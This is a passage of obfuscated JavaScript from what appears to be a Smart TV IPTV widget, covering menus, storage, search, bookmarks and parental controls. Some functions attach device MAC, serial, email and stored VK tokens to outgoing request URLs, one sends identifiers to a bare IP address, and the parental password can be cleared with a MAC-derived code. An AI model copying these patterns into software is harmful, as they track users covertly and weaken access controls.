if(gV(Menu[index],5)=="right"||Menu[index][2]=="Bookmarks"||Menu[index][2]=="cmdMoveBookmarks"||Menu[index][2]=="cmdAudio"||Menu[index][2]=="cmdEdit"||Menu[index][2]=="cmdSorting")
var f_img="<img align='right' style='padding-top: "+css_wh(5)+"px; margin-right: "+css_w(-7)+"px;' src='"+_img("_ST_b_f.png")+"' width='"+css_w(21)+"' height='"+css_wh(16)+"' />";else f_img="";if(m_img.indexOf("/")==0)m_img="http://browser.appinfo.su/img"+m_img;if(m_img!="")m_img="<img src='"+_img(m_img)+"' width='"+css_w(21)+"' height='"+css_wh(16)+"' />";else m_img="&nbsp;";if(Menu[index][2]=="cmdForkStore")l1II1IlOORHvj11O1Ypr+="<div style='height:1px;margin:2px 0px 0px 0px;border-top:1px solid gray;'>&nbsp;</div>";l1II1IlOORHvj11O1Ypr=l1II1IlOORHvj11O1Ypr+"<div"+lIl11llQV1Z1NOO0IYpr(1,[" onmouseover=\"llQI1IlixJG1OIIIYpr="+index+";kjtYpr.l1Q1OIO0duul1l1IlYprPos(llQI1IlixJG1OIIIYpr);\" onclick=\"subMenuEnter();\"",""])+" id='l1II1IlOORHvj11O1Ypr"+index+"' style='padding:3px 3px 3px 2px;margin:0px;white-space: nowrap;line-height:100%;max-width:600px;overflow:hidden;padding:0px 6px 0px 4px;'><div style='float:left;height: 100%;width:"+css_w(28)+"px;padding-top:0px;'>"+m_img+"</div>"+Menu[index][1]+f_img+"</div>"}
$_("MenuCh").style.width="auto";$_("MenuCh").style.display="block";lI1I1IxFCIh1l01llYpr("MenuCh",l1II1IlOORHvj11O1Ypr);ch_l=290;ch_h=70;if(m=="topmenu")ch_l=$_("kb6").offsetLeft-$_("MenuCh").offsetWidth-1;else if(m=="favmenu")ch_l=$_("kb5").offsetLeft-$_("MenuCh").offsetWidth-1;else if(getSelect()==-1){ch_h=25;ch_l=$_(allI()[insetSelect]).offsetLeft}else if(getSelect()<0){ch_h=73;ch_l=100+sdbarSel*100}else{ch_h=$_("site").offsetTop+$_("ch"+getSelect()).offsetTop+20;if(ch_h+$("#MenuCh").height()>$("#site").height()){ch_h=$("#site").height()-$("#MenuCh").height()-20}
ch_l=$_("ch"+getSelect()).offsetLeft+($_("ch"+getSelect()).offsetWidth/2);if((ch_l+40+$("#MenuCh").width())>$("#site").width())ch_l=$("#site").width()-$("#MenuCh").width()-40}
if(ch_l<0)ch_l=0;console.log("Menu h="+ch_h+" l="+ch_l+" mw="+$_("MenuCh").offsetWidth);if(ch_h<10)ch_h=10;$_("MenuCh").style.top=ch_h+"px";$_("MenuCh").style.left=Math.ceil(ch_l)+"px";$_("MenuCh").style.borderRadius="0px";$_("MenuCh").style.overflowY="auto";$_("MenuCh").style.maxHeight="90%";handler="context";kjtYpr.l1Q1OIO0duul1l1IlYprPos(0)};kjtYpr.l1Q1OIO0duul1l1IlYprPos=function(n,mode){if(subMenu.length){if(mode){subllQI1IlixJG1OIIIYpr=n;if(subllQI1IlixJG1OIIIYpr<0)subllQI1IlixJG1OIIIYpr=subMenu.length-1;if(subllQI1IlixJG1OIIIYpr>(subMenu.length-1))subllQI1IlixJG1OIIIYpr=0;for(var index=0;index<subMenu.length;index++){if(index==subllQI1IlixJG1OIIIYpr)
$_("subl1II1IlOORHvj11O1Ypr"+index).style.backgroundColor="#4281F4";else $_("subl1II1IlOORHvj11O1Ypr"+index).style.backgroundColor="transparent"}
return}else{if(submenuParent!=llQI1IlixJG1OIIIYpr)closeSubMenu();else return}}
llQI1IlixJG1OIIIYpr=n;if(llQI1IlixJG1OIIIYpr<0)llQI1IlixJG1OIIIYpr=Menu.length-1;if(llQI1IlixJG1OIIIYpr>(Menu.length-1))llQI1IlixJG1OIIIYpr=0;for(var index=0;index<Menu.length;index++){if(index==llQI1IlixJG1OIIIYpr){$_("l1II1IlOORHvj11O1Ypr"+index).style.backgroundColor="#4281F4"}else{$_("l1II1IlOORHvj11O1Ypr"+index).style.backgroundColor="transparent"}}
var tmp=$_("site").offsetTop;tocroll($_("MenuCh"),$_("l1II1IlOORHvj11O1Ypr"+llQI1IlixJG1OIIIYpr));$_("site").offsetTop=tmp};function tocroll(p,c){var ch_pos=c.offsetTop-p.scrollTop;var site_bot=p.offsetHeight;var y_t=Math.ceil(c.offsetTop-site_bot*0.18);var y_b=Math.ceil(c.offsetTop+c.offsetHeight-site_bot*0.87);if(y_t<p.scrollTop){p.scrollTop=y_t}else if(y_b>p.scrollTop)p.scrollTop=y_b}
function cookieCompress(m,v,n){if(v=="")return"";if(n.indexOf("url")==0){if(m=="setsW"){var t=l0QO11lOz0bfh10l0Ypr(v);var s="";if(t.length>1)var x=t.length-2;else x=0;for(var i=x;i<t.length;i++){s+=t[i].url+"~"+t[i].img+"~"+t[i].title+"|||"}
return s}else if(m=="readW"){var t=v.split("|||");var a=[{"url":'about:blank',"img":"","title":""}];for(var i=0;i<t.length;i++){var x=t[i].split("~");if(x[0]==undefined||x[0]=="")continue;a.push({"url":x[0],"img":x[1],"title":x[2]})}
return llIl1I1HlMgNII1IO0Ypr(a)}}else if(n=="settings"){v=v.replace(/\r/g,"").replace(/\n/g,"");var jsonSets=["otherSettings","JTVRegion","next","quality","passwordkey","password","recovery","player","fon","pr","color","remote","remoteip","streamplayer","lang","buffer","Ph","Pw","vk_code","vk_id","vk_token","fs","sortiptv","xmode","pip","audioplayer","ts","timeoutiptv","rate","country","snow","livesearch","weather","serv","sidebar","return","adult","time","udp","keyboard","proxy","third","scrsaver","name","zoom","acestream","font","torrserve","headers"];if(m=="setsW"){var t=l0QO11lOz0bfh10l0Ypr(v);var s="";for(var i=0;i<jsonSets.length;i++){if(typeof t[jsonSets[i]]=='undefined')t[jsonSets[i]]="";s+=t[jsonSets[i]]+"|"}
return s}else if(m=="readW"){var t=v.split("|");var a={"zakladki.xml":'_FPzakladki_ / _FPRaznoe_',"zakladkiSerials.xml":"_FPzakladki_ / _FPSeriali_","zakladkiFilms.xml":"_FPzakladki_ / _FPFilmi_","zakladkiIPTV.xml":"_FPzakladki_ / IPTV"};for(var i=0;i<jsonSets.length;i++){a[jsonSets[i]]=t[i]}
return llIl1I1HlMgNII1IO0Ypr(a)}}}
sd_timer={};var wchanged=0;kjtYpr.lll0Il11OxICbl1ll0Ypr=function(n,v,sd){try{wchanged=1;v=v.toString();v=""+v;v=v.replace(/\r/g,"").replace(/\n/g,"").replace(/\t/g,"");if(n=="settings")v=cookieCompress("setsW",v,n);FileObj[n]=v;if(platform=="sams"){v=""+v;var fileSystemObj=new FileSystem();var fileObj=fileSystemObj.openCommonFile(curWidget.id+'/'+n,'w');if(fileObj!=null){fileObj.writeAll(v);fileSystemObj.closeCommonFile(fileObj)}}else{if(ifrrw){$_("ifrrw").contentWindow.postMessage({'cmd':'write'+n,'text':v},"*");return}
if(!supportStorage){if(n=="rek"||n=="rt")kjtYpr.lll0Il11OxICbl1ll0YprC(n,v);else if(n=="settings")kjtYpr.lll0Il11OxICbl1ll0YprC(n,v);else if(n=="searches"||n=="enteres"||n=="glsearch"||n=="glstart")kjtYpr.lll0Il11OxICbl1ll0YprC(n,v);else if(n.indexOf("xxurl")==0)kjtYpr.lll0Il11OxICbl1ll0YprC(n,v);FileObj[n]=v}else{if(window.localStorage!==null){window.localStorage.setItem(n,v)}else{console.log("_FPOshibka_ чтения данных!");kjtYpr.inf("_FPOshibkaSohrDannih_!")}}}}catch(e){console.log(e);return""}};var defdel="";kjtYpr.l1O0l1gmmv01O11Ypr=function(n){if(n=="")return"";var s="";try{if(TS&&autoimpok>=2){if(typeof FileObj[n]!="undefined")s=FileObj[n];else s=""}else{if(sd_timer[n]!=null)return FileObj[n];if(platform=="sams"){var fileSystemObj=new FileSystem();var fileObj=fileSystemObj.openCommonFile(curWidget.id+'/'+n,'r');if(fileObj!=null){s=fileObj.readAll();fileSystemObj.closeCommonFile(fileObj)}else s=""}else{if(ifrrw){if(typeof FileObj[n]!="undefined")s=FileObj[n];else s=""}else if(!supportStorage){if(n=="rek"||n=="rt")s=kjtYpr.l1O0l1gmmv01O11YprC(n);else if(n=="settings")s=cookieCompress("readW",kjtYpr.l1O0l1gmmv01O11YprC(n),n);else if(n=="searches"||n=="enteres"||n=="xurlInset"||n=="glsearch"||n=="glstart")s=kjtYpr.l1O0l1gmmv01O11YprC(n);else if(n.indexOf("xurl")==0)s=cookieCompress("readW",kjtYpr.l1O0l1gmmv01O11YprC(n),n);else if(typeof FileObj[n]!='undefined')s=FileObj[n]}else if(window.localStorage!==null){if(typeof window.localStorage.getItem(n)!="string"||typeof localStorage.getItem(n)=="undefined")s="";else s=window.localStorage.getItem(n)}else{console.log("_FPOshibka_ чтения данных!");kjtYpr.inf("_FPOshibkaChDannih_!")}}}}catch(e){console.log(e);s=""}
if(n=="settings"&&s.indexOf("{")==-1&&(s.indexOf("|")!=-1||s.indexOf("7C")!=-1))s=cookieCompress("readW",s,n);if(!isValidJSON(s,n)){s="";console.log("damage "+n);kjtYpr.inf(n+" damage, cleared!")}
if(s==""&&n=="glstart")s=defdel;s=s.replace(/_OS_/g,"http://obovse.ru/smarttv/");s=s.replace(/_OL_/g,"http://obovse.ru/alexkdpulg.php?list=");s=s.replace(/\r/g,"").replace(/\n/g,"").replace(/\t/g,"");if(n.indexOf("zakladki")==0&&s!=""&&s.indexOf("null")>0){var data=l0QO11lOz0bfh10l0Ypr(s);for(var index=0;index<data.channels.length;index++){if(data.channels[index]==null){data.channels.splice(index,1);index--;continue}}
s=llIl1I1HlMgNII1IO0Ypr(data)}
return s};function isValidJSON(src,n){try{if(src.indexOf('<div id="')>0)return!1;if(src.indexOf("{")==0||src.indexOf("[")==0){var i=-1;while(src[++i]){}
if(src[i-1]=="]"||src[i-1]=="}"||src[i-2]=="]"||src[i-2]=="}"||src[i-3]=="]"||src[i-3]=="}")return!0;else return!1}}catch(e){return!1}
return!0};kjtYpr.l1O0l1gmmv01O11YprC=function(name){try{if(platform=="android-device")return"";if(typeof FileObjC[name]!="undefined")return FileObjC[name];var matches=document.cookie.match(new RegExp("(?:^|; )"+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+"=([^;]*)"));return matches?decodeURIComponent(matches[1]):""}catch(e){return""}};FileObjC={};kjtYpr.lll0Il11OxICbl1ll0YprC=function(name,value){try{if(platform=="android-device")return"";FileObjC[name]=value;if(ifrrw){$_("ifrrw").contentWindow.postMessage({'cmd':'lll0Il11OxICbl1ll0YprC'+name,'text':value},"*");return}
props={path:"/",expires:99999999};var exp=props.expires;if(typeof exp=="number"&&exp){var d=new Date();d.setTime(d.getTime()+exp*1000);exp=props.expires=d}
if(exp&&exp.toUTCString){props.expires=exp.toUTCString()}
value=encodeURIComponent(value);var updatedCookie=name+"="+value;for(var propName in props){updatedCookie+="; "+propName;var propValue=props[propName];if(propValue!==!0){updatedCookie+="="+propValue}}
document.cookie=updatedCookie;console.log("uc1="+updatedCookie);console.log("uc2="+document.cookie);if(document.cookie.indexOf(name+"="+value)==-1&&!supportStorage)setTimeout(function(){kjtYpr.inf("Ошибка записи данных в Cookies! Сбросьте настройки виджета",1500)},300)}catch(e){return!1}};function lI0I0QIO10llQlQI1Ypr(str,m,el){try{$('#'+VK.id).get(0).scrollLeft=$('#'+VK.id).get(0).scrollWidth;str=parseHtmlEnteties(str);console.log("lI0I0QIO10llQlQI1Ypr="+str+" xml_live="+xml_live);if(el==null)el=VK.el;if(gV(el,"presearch").indexOf("http")!=0){if(typeof el.search=="object"||(el.title.match(/(ошук|arch|оиск|poisk|искат)/i)))
el.presearch="http://omnibox.spiderxml.com/?type=auto"}
return showPresearch(str,el,++kjtYpr.SUBREQUEST_ID)}catch(e){console.log(e)}};var lastStr="",xml_livetimer,xml_live_gstimer,xml_live_url="",livecarettimer,livecaret=!1;function liveSearch(str){console.log("livesearch="+kjtYpr.GL.livesearch);if(livecaret){console.log("livecaret");clearTimeout(xml_livetimer);clearTimeout(xml_live_gstimer);xml_livetimer=setTimeout("liveSearch('"+str+"');",2500);return}
if(handler!="vk"&&lastStr=="")return;clearTimeout(xml_live_gstimer);if(kjtYpr.GL.livesearch>0&&str.length>2){if(lastStr!=str){if(!xml_live)xml_live_url=oInset[insetActive].curCh("playlist_url");lastStr=str;kjtYpr.ll0I0OAVu11I01lYpr=str;l11II1_JfwgOlIl1Ypr=Math.random();ol1IO0ORc1_tI0QlYpr(xml_live_url,0,!0)}}}
function lO0IIlIDUlOllIO0IYpr(str){console.log("lO0IIlIDUlOllIO0IYpr kjtYpr.inputId="+kjtYpr.inputId);var el=VK.el;lI1I1IxFCIh1l01llYpr("presearch","");curPage=oInset[insetActive];if(kjtYpr.PresearChSelected==-1){if(getSelect()>=0){$_("ch"+getSelect()).style.visibility="visible";if(str!="")lI1I1IxFCIh1l01llYpr("titleid"+getSelect(),str)}
saveQuickEnteres(str,el,kjtYpr.inputId)}
if(kjtYpr.inputId=='cmdEditUrl'){if(kjtYpr.PresearChSelected==-1){if(ll0l0loMtIlIOYpr()){var t=getVars("start");t.fav[el.id].playlist_url=str;setVars("start",t);$_("vk").style.display="none";kjtYpr.inputId="";handler="menu";page_rs({"src":"_reload"});return}}}
if(kjtYpr.inputId=='cmdUrlIcon'){if(kjtYpr.PresearChSelected!=-1){$_(VK.id).value=kjtYpr.lll110DUxOQIl1Ypr[kjtYpr.PresearChSelected];kjtYpr.PresearChSelected=-1;kjtYpr.l1O10l10HkBwOllII0Ypr();return}
if(ll0l0loMtIlIOYpr()){var t=getVars("start");t.fav[el.id].logo_30x30=str;setVars("start",t);$_("vk").style.display="none";kjtYpr.inputId="";handler="menu";page_rs({"src":"_reload"});return}else if(el.playlist_url.indexOf("bookmarks/")==0){xhr_bookmark(el.playlist_url,kjtYpr.inputId,str)}}else if(kjtYpr.inputId=='tomflight'){if(kjtYpr.PresearChSelected!=-1){$_(VK.id).value=kjtYpr.lll110DUxOQIl1Ypr[kjtYpr.PresearChSelected];kjtYpr.PresearChSelected=-1;kjtYpr.l1O10l10HkBwOllII0Ypr();return}
if(str=='')return;kjtYpr.lll0Il11OxICbl1ll0Ypr("tfn",str);lIl0l1OX1vbll1I1IQYpr("http://185.158.114.122/obovse.ru/smarttv/api.php?do=tomflight&setname="+str+"&initial="+box_client+"|"+kjtYpr.mac+"|"+kjtYpr.hardware+"|"+kjtYpr.serial,"tomflight");$_("vk").style.display="none";kjtYpr.inputId="";lI1I1IxFCIh1l01llYpr("infoList","");confirmed.create("Новый рекорд!<br>Счет: "+t_xnum+"<br>","Tom Flite","_FPZakrit_|_FPNachatZanovo_");confirmed.fun0=function(){tscreen="main";$_("game").style.display="none";$_("game").style.zIndex="0"};confirmed.fun1=function(){tomflight_start()}}else if(kjtYpr.inputId=='cmdRename'){if(kjtYpr.PresearChSelected!=-1){$_(VK.id).value=kjtYpr.lll110DUxOQIl1Ypr[kjtYpr.PresearChSelected];kjtYpr.PresearChSelected=-1;kjtYpr.l1O10l10HkBwOllII0Ypr();return}
if(str=='')return;if(ll0l0loMtIlIOYpr()){var t=getVars("start");t.fav[el.id].title=str;setVars("start",t);$_("vk").style.display="none";kjtYpr.inputId="";handler="menu";page_rs({"src":"_reload"});return}else if(el.playlist_url.indexOf("bookmarks/")==0){xhr_bookmark(el.playlist_url,kjtYpr.inputId,str)}else if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("bookmarks/")==0){xhr_bookmark(gP("lIQ0Il1IlIb1Il1OYpr"),"bookmarkRename",str)}else if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("zakladki")==0){try{s=kjtYpr.l1O0l1gmmv01O11Ypr(gP("lIQ0Il1IlIb1Il1OYpr"));var data=l0QO11lOz0bfh10l0Ypr(s);if(data==null){data={};data["cha"+"nnels"]=[]}
data["cha"+"nnels"][getSelect()].title=str;kjtYpr.lll0Il11OxICbl1ll0Ypr(gP("lIQ0Il1IlIb1Il1OYpr"),llIl1I1HlMgNII1IO0Ypr(data))}catch(e){console.log(e)}
var select2=getSelect();handler="menu";kjtYpr.l1Q1OIO0duul1l1IlYprPlay("cmdReload");oInset[insetActive].focused(select2)}}else if(kjtYpr.inputId=='setpass'){if(str=='')return;kjtYpr.GL.passwordkey=str;kjtYpr.inf("_FPParol_ _FPustanolen_!",1000);kjtYpr.GL.password='On';console.log("set password="+kjtYpr.GL.password+kjtYpr.GL.passwordkey);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));page_rs({"src":"_reload"})}else if(kjtYpr.inputId=='delpass'){if(str=='')return;if(kjtYpr.GL.passwordkey==str||str==kjtYpr.mac.substr(8,2)+kjtYpr.mac.substr(2,2)+kjtYpr.mac.substr(5,1)){kjtYpr.GL.passwordkey="";kjtYpr.GL.password='Off';kjtYpr.inf("_FPParol_ удален!",1000);kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));page_rs({"src":"_reload"})}else kjtYpr.inf("_FPParol_ _FPnePodhodit_!",1000)}else if(kjtYpr.inputId=='unlockpass'&&str!=""){if(str=='')return;if(kjtYpr.GL.passwordkey==str){l11II1_JfwgOlIl1Ypr=Math.random();if(kjtYpr.inputId2=="VivatRod")kjtYpr.Password2=str;else kjtYpr.Password=str;kjtYpr.inf("_FPDostupRazreshen_!",1000);$_("vk").style.display="none";kjtYpr.inputId="";$_("main").style.display="block";handler="menu";kjtYpr.l1O0OOzczEvllIOYpr();if(kjtYpr.Password=="0000")kjtYpr.popUp("<b><i>_FPVineSmP_</i></b>");else kjtYpr.popUp("<i>_FPParolDeistDk_</i>")}else{kjtYpr.inf("_FPParol_ _FPnePodhodit_!",1000);return}}else if(kjtYpr.PresearChSelected==-1){kjtYpr.ll0I0OAVu11I01lYpr=str;el.type=gV(el,"type");oInset[insetActive].navigate(el,null,null,{"text":str,"id":kjtYpr.inputId})}else{var q=kjtYpr.lll110DUxOQIl1Ypr[kjtYpr.PresearChSelected];if(gV(q,"type")=="se"){kjtYpr.PresearChSelected=-1;lO0IIlIDUlOllIO0IYpr(str);return}
if(gV(q,"xml_url")!=""){returnVK();goBack=!1;OpenUrl({"title":q.q,"playlist_url":q.xml_url,"logo_30x30":gV(q,"img")});return}
el.type_quicksearch=gV(q,"type");$_(VK.id).value=q.q;if(el.type_quicksearch=="xml")kjtYpr.popUp("Поиск будет только по проиндексированным <img src='"+_img("_ST_xmls.png")+"' width=30 /> XML плейлистам",1500);kjtYpr.PresearChSelected=-1;if(kjtYpr.GL.keyboard=="system"){console.log("VK set focus");VK.focus.removeAttribute("readonly");VK.focus.focus()}
if($_(VK.id).value.indexOf("http")==0&&VK.lI0l001QluKXlIl0Ypr[1][0][0]!="q"){VK.enter("Eng");lI0I0QIO10llQlQI1Ypr(VK.focus.value);return}
VK.pos[0]=2;VK.pos[1]=13;VK.setpos();if($_(VK.id).value.indexOf("http")==0)lI0I0QIO10llQlQI1Ypr(VK.focus.value);else if(VK.Mode==0)lI0I0QIO10llQlQI1Ypr(VK.focus.value,!0);kjtYpr.l1O10l10HkBwOllII0Ypr()}}
function returnVK(m){console.log("returnVK");console.trace();$_("vk").style.display="none";lI1I1IxFCIh1l01llYpr("vk","");$_("main").style.display="block";handler="menu";if(m==null){Ill1110().ll0Ol1Z0yl0lI1Ypr();Ill1110().loadPage=null;if(getSelect()>=0&&$_("ch"+getSelect())!=null){$_("ch"+getSelect()).style.visibility="visible"}
if(VK.focus.value!="")oInset[insetActive].curCh()["value"]=VK.focus.value}}
kjtYpr.l1O10l10HkBwOllII0Ypr=function(){console.log("l1O10l10HkBwOllII0Ypr "+kjtYpr.PresearChSelected);if(kjtYpr.PresearChSelected<-1)kjtYpr.PresearChSelected=kjtYpr.lll110DUxOQIl1Ypr.length-1;if(kjtYpr.PresearChSelected>kjtYpr.lll110DUxOQIl1Ypr.length-1)kjtYpr.PresearChSelected=-1;if(kjtYpr.PresearChSelected==-1){$_("presearch").style.borderColor="transparent";$_(VK.id).style.border="2px solid #65D0E4"}else{$_("presearch").style.borderColor="#65D0E4";$_(VK.id).style.border="2px solid transparent"}
for(var index=0;index<kjtYpr.lll110DUxOQIl1Ypr.length;index++){if(gV(kjtYpr.lll110DUxOQIl1Ypr[index],"type")=="se"&&(kjtYpr.PresearChSelected==-1||kjtYpr.PresearChSelected==index))
$_("l1II1IlOORHvj11O1Ypr"+index).style.backgroundColor="#465057";else $_("l1II1IlOORHvj11O1Ypr"+index).style.backgroundColor="";if(index==kjtYpr.PresearChSelected){$_("l1II1IlOORHvj11O1Ypr"+index).style.color="orange"}else{$_("l1II1IlOORHvj11O1Ypr"+index).style.color="white"}}};kjtYpr.ll1I1IIOI0ohA1I1IYpr=function(){if(kjtYpr.l0IlII1xde1110llYpr<0)kjtYpr.l0IlII1xde1110llYpr=kjtYpr.l0O1011I0MAZWd0100lIYpr.length-1;if(kjtYpr.l0IlII1xde1110llYpr>kjtYpr.l0O1011I0MAZWd0100lIYpr.length-1)kjtYpr.l0IlII1xde1110llYpr=0;try{for(var index=0;index<kjtYpr.l0O1011I0MAZWd0100lIYpr.length;index++){if(index==kjtYpr.l0IlII1xde1110llYpr){$_("ql1II1IlOORHvj11O1Ypr"+index).style.border="1px solid white"}else{$_("ql1II1IlOORHvj11O1Ypr"+index).style.border="1px solid transparent"}}}catch(e){console.log(e)}};function getbut(id,img,url,text){html="<div class='btextss' id='dbt"+id+"' style='float:left;'"+(text==""?"display:none;":"")+lIl11llQV1Z1NOO0IYpr(1,[" onclick=\""+url+"\"",""])+"><img id='but"+id+"' style='margin-top:2px; padding-left:"+css_w(12)+"px;width:16px; height:16px;' src='"+_img(img)+"' />";html+="<span id='bt"+id+"' style=''>"+text+"</span>";html+="</div>";return html}
function tmf(){clearTimeout(np_timer);if(platform=="tizen")keyHandler({"keycode":10009,"preventDefault":function(){}});else keyHandler({"keycode":VK_BACK,"preventDefault":function(){}})}
var goBack=!1,norek=!1;function gotoStart(){try{oInset[insetActive].navigate("about:blank");kjtYpr.Password=""}catch(e){kjtYpr.popUp("Err open START menu:<br>"+e.message,5000);console.log(e)}}
function lIIOl1I0QUB_llIOYpr(url,mode){try{url=oInset[insetActive].get("url");if(url.indexOf("no_save")>0||url=="submenu")return 0;if(mode||version_local_js){var n_start=9,n_per=9,n_zakl=9,j=0;for(var i=oInset[insetActive].history.length-1;i>-1;i--){if(ll0l0loMtIlIOYpr(oInset[insetActive].history[i].url)&&n_start==9)n_start=j;if(oInset[insetActive].history[i].title=="_FPPerPoAdr_"&&n_per==9)n_per=j;if((oInset[insetActive].history[i].url.indexOf("bookmarks")==0||oInset[insetActive].history[i].url.indexOf("zakladki")==0)&&n_zakl==9)n_zakl=j;j++}
console.log(n_start+"/"+n_per+"/"+n_zakl);if(n_start<5||n_per<3||n_zakl<3||mode){if(n_start==0||n_per==0||n_zakl==0)return 0;console.log("save prev");var savePrev=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("prev_cache"));if(savePrev==null)savePrev={};console.log(url);if(typeof prev[url].setcache!="undefined")if(prev[url].setcache!=""){kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> Эта страница была загружена с кеша и может содержать устаревшие данные! Проверьте наличие интернет соединения или возможно страница была перемещена по новому адресу!",2200);console.log("not write to cache");return 0}
savePrev[url]={"setimg":oInset[insetActive].get("img"),"settitle":oInset[insetActive].get("title"),"typeList":prev[url].typeList,"setcache":Math.ceil(T.inetTime/1000),"channels":prev[url].channels,"url":url};kjtYpr.lll0Il11OxICbl1ll0Ypr("prev_cache",llIl1I1HlMgNII1IO0Ypr(savePrev))}}
return 1}catch(e){console.log(e)}}
function nohtml(){console.log("no html player");kjtYpr.l1O0OOzczEvllIOYpr("media")}
var rCook=new RegExp("^https?://(www\.|m\.|p\.lnka\.ru/|fxmlparsers\.ru/)?(https?://)?(.*?)(:|\\?|/|$|#)");function addident(u,m){if(m==null)m=u;var ident="box_client=lg&box_mac="+kjtYpr.mac+"&initial="+box_client+"|"+kjtYpr.mac+"|"+encodeURIComponent(gV(kjtYpr,"hardware"))+"|"+kjtYpr.serial+"|"+gnxu+"|"+encodeURIComponent(gV(kjtYpr.GL,"name"))+"&vr="+vr+"&platform="+uaJ+"&country="+ipCountry+"&tvp="+timestamp+"&hw="+countHw;if(app_cors||(kjtYpr.GL.remote>=2&&kjtYpr.GL.remoteactive)){var type="";if(app_cors){if(kjtYpr.series=="D"||kjtYpr.series=="C")type="sams_d";else type=uaJ}else if(kjtYpr.GL.remoteip.indexOf(":8027")>0)type="curl_windows";else if(kjtYpr.GL.remoteip.indexOf(":8028")>0)type="curl_androind";ident+="&cors="+type}
if(user!=null)ident+="&box_user="+encodeURIComponent(gV(user,"email"));if(typeof kjtYpr.macv!="undefined")ident+="&mv="+kjtYpr.macv;if(oID!="")ident+="&oID="+oID;if(u==null){ident=ident.replace(/ /g,"%20");return"&"+ident}
console.log(llQOIO10IiuQlOl0Ypr);var post=gV(u.match(/(#POST.*$)/),1);u=u.split("#")[0];if(!u.match(/(alexkdpulg\.php|\/obovse\.ru\/)/)&&u.match(/^https?:\/\//)){console.log("read llQOIO10IiuQlOl0Ypr "+u);var dm=u.match(rCook);console.log(dm);if(dm!=null){dm=dm[3]}else dm="localhost";console.log(llQOIO10IiuQlOl0Ypr[dm]);if(kjtYpr.GL.vk_id!=""&&dm=="vk.com"&&typeof llQOIO10IiuQlOl0Ypr[dm]=="undefined"){if(typeof llQOIO10IiuQlOl0Ypr[dm]=="undefined")llQOIO10IiuQlOl0Ypr[dm]={};llQOIO10IiuQlOl0Ypr[dm].vk_id=kjtYpr.GL.vk_id;llQOIO10IiuQlOl0Ypr[dm].vk_token=kjtYpr.GL.vk_token}
if(typeof llQOIO10IiuQlOl0Ypr[dm]!="undefined"){for(var i in llQOIO10IiuQlOl0Ypr[dm])ident+="&cookie["+i+"]="+encodeURIComponent(llQOIO10IiuQlOl0Ypr[dm][i]);}}
if(u.indexOf("initial=")>0&&u.indexOf("box_mac")>0)return u+post;if(u.indexOf("?")>0)u+="&";else u+="?";ident=ident.replace(/ /g,"%20");u+=ident;if(m==1)u=u.replace(/\|/g,"-.-");return u+post}
function showParrent(m){console.log("pass to "+gP("lIQ0Il1IlIb1Il1OYpr"));if(kjtYpr.GL.passwordkey=="0000")kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /><span style=\"font-size:120%\"><b> _FPParol_ _FPpoumolch_ 0000<b></span><br><i>_FPSmIotk_ _FPparol_ _FPmoV_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ -> _FPNastroiki_ -> _FPRodKontr_</i>");try{VK.Show(1,null,'unlockpass',"_FPDlDostVv_ _FPparol_:");if(m!=null)kjtYpr.inputId2=m;else kjtYpr.inputId2=null}catch(e){console.log(e)}}
var pl_serv=0,pl_count=1;var flashmode=null,lastmode=null,is_rek=!1,rek_mode;var handmode=null;function getmode(url){if(url==null)url="";var m;if(handmode!=null)m=handmode;else{}
if(platform=="sams"&&m!="jw")m="media";return m}
function is_xxx(n,n2){if(typeof n=="object"){if(gV(n,"title")==""&&typeof n[0]=="undefined")return 0;for(var i in n){if(is_xxx(n[i]))return 1}
return 0}
if(n2!=null)if(n2!="")n=n2;if(n==null)n="";if(typeof n!='string')return 0;n=n.split("#POST")[0];if(n.match(/^(cmd:)/))return 0;if(n.match(/(http:|\/\/)/)){if(n.match(/(18_plus|18plus|porn| ххх | ххх$|^xxx | sex |sex |adult)/i))return 1;else return 0}
if(n.match(/(русская ночь|18plus|playboy|creampi|compilati|18_plus|18\+|porn|hustler| ххх | ххх$|^xxx | sex |sex |adult| anal|pron|masturb|порно|секс| анал|мастурб|минет|эротика|brazzers)/i))return 1;return 0}
function is_parse_self(u1,u2){var dm=u1.match(/^https?:\/\/(.*?)(:|\?|\/|$)/);if(dm!=null){dm2=u2.match(/^https?:\/\/(.*?)(:|\?|\/|$)/);if(dm2!=null)if(dm[1]==dm2[1])return 1}
return 0}
function is_local(url){if(url.match(/^(\/|usb:\/\/)/))return!0;if(url.match(/^http:\/\/(127\.|^10\.|^172\.1[6-9]\.|^172\.2[0-9]\.|^172\.3[0-1]\.|^192\.168\.)/))return!0;if(url.match(/(\/treeview|:45397\/|:8027\/|:8028\/|\/parserlink|\/smarttv\/acestream\.php)/))return!0;var ip="";if(kjtYpr.GL.acestream!="")ip=kjtYpr.GL.acestream.split(":")[0];if(kjtYpr.GL.remoteip!="")ip=kjtYpr.GL.remoteip.split(":")[0];if(ip!="")if(url.indexOf("http://"+ip)==0)return!0;return!1}
function is_directly(url,wp){if(is_local(url)||wp==-2||url.match(/(alexkdpulg\.php|mylist\.obovse\.ru|obovse.ru\/smarttv)/))return!0;return!1}
function fromSpider(){var res=!1;if(gP("lIQ0Il1IlIb1Il1OYpr").indexOf("http")!=0||gP("lIQ0Il1IlIb1Il1OYpr").indexOf("http://cloudflare.appinfo.su/browseraccount")==0||gP("lIQ0Il1IlIb1Il1OYpr").indexOf("alexkdpulg.php?bylist=")>0)return!1;for(i=oInset[insetActive].history.length-1;i>=0;i--){try{var url=oInset[insetActive].history[i].url;var t=oInset[insetActive].history[i].title;console.log("fromSpider "+i+"="+url);if(url=="mylist"||url=="favorites"||t.indexOf("_FPPerPoAdr_")==0)return!1;if(url.indexOf("http://spiderxml.com/top")==0){console.log("from spider");return!0}
if(ll0l0loMtIlIOYpr(url)){console.log("stop");break}}catch(e){}}
return res}
